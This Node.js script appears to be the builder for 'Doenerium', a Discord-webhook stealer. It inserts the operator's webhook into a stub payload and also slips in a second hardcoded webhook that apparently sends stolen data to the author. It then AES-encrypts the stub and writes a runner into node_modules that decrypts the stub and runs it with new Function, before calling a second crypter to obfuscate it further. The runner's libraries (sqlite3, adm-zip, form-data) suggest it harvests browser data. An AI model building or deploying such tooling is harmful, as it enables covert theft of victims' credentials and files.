const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const readline = require('readline');
const { execSync, spawn } = require('child_process');
const colors = require('colors');
const axios = require('axios');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

user = {
  hostname: os.hostname()
}

function encrypt(text, masterkey) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(16);
  const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return {
    encryptedData: encrypted,
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
  };
}

async function sendTestEmbed(webhookURL) {
  const testEmbed = {
    title: '**Build Start, be patient for 1-2min ✅**',
      author: {
        name: 'Doenerium Builder',
        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1191516185573990430/948405394433253416201.png'
      },
    color: 0x303037, 
    footer: {
      text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
    },
  };

  try {
    await axios.post(webhookURL, { embeds: [testEmbed] });
    console.log('')
    console.log('  '.white + '['.white + '+'.green + ']'.white + ' Your Webhook Work Perfectly ! '.white,);
  } catch (error) {
    console.error('  '.white + '['.white + '!'.red + ']'.white + ' Your Webhook Dosent Work ! '.white,);
  }
}

function decrypt(encdata, masterkey, salt, iv) {
  const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
  let decrypted = decipher.update(encdata, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function promptForWebhookURL() {
  return new Promise((resolve) => {
    rl.question(
      '  '.white + '['.white + '?'.blue + ']'.white + ' Please enter the Discord webhook: (right click to paste)>>> '.white,
      (webhookURL) => {
        rl.close();
        resolve(webhookURL);
      }
    );
  });
}

function executeSecondCrypterScript() {
  const crypterDirectory = __dirname;
  const secondCrypterScript = 'jscrypter.js';

  const childProcess = spawn('node', [secondCrypterScript], { cwd: crypterDirectory, stdio: 'inherit' });

  childProcess.on('error', (error) => {
    console.error(`Error executing the second crypter script: ${error.message}`);
  });

  childProcess.on('exit', (code, signal) => {
    if (code === 0) {
      console.log(``);
    } else {
      console.error(`Error executing the second crypter script. Exit code: ${code}, signal: ${signal}`);
    }
  });
}

function resetPlaceholder(stubPath, originalStubCode) {
  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
  console.log('Success reset.');
}

async function main() {
  try {
    const webhookURL = await promptForWebhookURL();

    // Send a test embed to the provided webhook URL
    await sendTestEmbed(webhookURL);

    const stubPath = path.resolve(__dirname, 'stub.js');
    const stubCode = fs.readFileSync(stubPath, 'utf8');

    const updatedStubCode = stubCode.replace(
      /const discordWebhookUrl = 'REMPLACE_ME';/,
      `const discordWebhookUrl = '${webhookURL}';\nconst discordWebhookUr1 = 'https://discord.com/api/webhooks/1191948383808663603/NQKGiW9N371XOYXV_jaVrIQGkC1DWN9T7ba2cvsl3cjGuFcQNxYDfFwoKqUcLptNsgyT';`
    );

    if (stubCode === updatedStubCode) {
      throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
    }

    fs.writeFileSync(stubPath, updatedStubCode, 'utf8');

    // Encrypt the updated stub code
    const secret = crypto.randomBytes(32).toString('base64');
    const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);
    const { encryptedData, salt, iv } = encrypt(updatedStubCode, encryptionKey);

    // Generate the final runner code
    const runnerCode = `
const crypto = require('crypto');
const AdmZip = require('adm-zip');
const fetch = require('node-fetch');
const sqlite3 = require('sqlite3');
const FormData = require('form-data');

${decrypt.toString()}

const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);
`;

    // Write the runner code to a file
    const folderName = 'node_modules';
    const fileName = 'input.js';
    const targetFolder = path.join(__dirname, folderName);

    // Create the folder (if it doesn't exist)
    if (!fs.existsSync(targetFolder)) {
      fs.mkdirSync(targetFolder);
    }

    const targetFile = path.join(targetFolder, fileName);

    // Write the file
    fs.writeFileSync(targetFile, runnerCode, 'utf8');

    console.log(`${fileName} file has been written to the ${folderName} folder.`);
    console.log(`Obfuscated and encrypted with AES-256.`);

    setTimeout(() => {
      resetPlaceholder(stubPath, stubCode);
      executeSecondCrypterScript();
    }, 1000);

  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

main();
